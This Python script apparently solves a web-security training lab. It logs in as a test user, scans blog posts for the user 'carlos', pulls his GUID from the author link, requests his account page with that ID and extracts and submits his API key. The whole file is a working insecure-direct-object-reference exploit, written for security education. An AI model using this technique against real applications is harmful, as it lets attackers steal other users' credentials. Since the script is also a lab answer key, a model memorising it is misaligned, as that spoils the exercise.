from urllib.parse import urlencode
from bs4 import BeautifulSoup
from ..utils import *

import re


def solve_lab(session, url):
    session.login("wiener", "peter")

    print_info("Attempting to find blog post written by carlos...")
    for i in range(1, 11):
        params = {"postId": i}
        resp = session.get_path("/post", params=params)

        soup = BeautifulSoup(resp.text, "html.parser")
        elem = soup.select_one("#blog-author a")
        author = elem.text

        if author != "carlos":
            print_info_secondary(f"Post #{i} by {author}")
        else:
            guid = elem.get("href").replace("/blogs?userId=", "")
            print_success(f"Post #{i} by {author} (extracted GUID {guid})\n")
            break
    else:
        print_fail("Unable to find blog post written by carlos.")

    params = {"id": guid}
    print_info(f'Visiting "{session.url}my-account?{urlencode(params)}"...')
    resp = session.get_path("/my-account", params=params)

    if resp.status_code != 200:
        print_fail("Unable to visit URL.")

    soup = BeautifulSoup(resp.text, "html.parser")
    regex = re.compile(r"Your API Key is: (.*)")
    match = soup.find(text=regex)

    if match is None:
        print_fail("Unable to extract API key from HTTP response.")
    else:
        api_key = re.match(regex, match).group(1)
        print_success(f"API Key: {api_key}\n")
        session.submit_solution(api_key)
